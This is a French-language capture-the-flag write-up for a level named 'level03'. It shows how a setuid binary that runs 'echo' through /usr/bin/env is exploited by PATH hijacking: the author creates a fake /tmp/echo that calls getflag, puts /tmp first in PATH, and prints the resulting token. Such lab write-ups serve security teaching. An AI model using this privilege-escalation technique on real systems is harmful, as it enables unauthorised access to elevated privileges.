# LEVEL 03
On a ce fichier
```
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

C'est un fichier qui a les meme droit que getflag
le premier s dans les droits veut dire SETUID
le deuxième s est SETGID

on teste son execution
```
./level03
Exploit me
```

On essaie de voir ce qu'il y'a dans le fichier
```
hexdump -C level03
```

il y'a deux lignes qui nous intéresse
```
000005e0  2f 75 73 72 2f 62 69 6e  2f 65 6e 76 20 65 63 68  |/usr/bin/env ech|
000005f0  6f 20 45 78 70 6c 6f 69  74 20 6d 65 00 00 00 00  |o Exploit me....|

-> /usr/bin/env echo Exploit me
```

ce echo de /usr/bin/env rend le code vulnerable car on peut changer ce chemin vers un autre fichier qu'on veut utiliser comme echo et puisque le fichier a les meme droit que getflag on va essayer de l'utiliser

Mettre le getflag en tmp
```
echo '/bin/getflag' > /tmp/echo;
```

ajouter le droit d'executtion
```
chmod +x /tmp/echo;
```

ajouter le tmp dans le PATH
```
export PATH=/tmp:$PATH;
```

on réexecute level03
```
./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

Le lien qui nous a aidé a comprendre la vulnerabilité de ce code
https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code
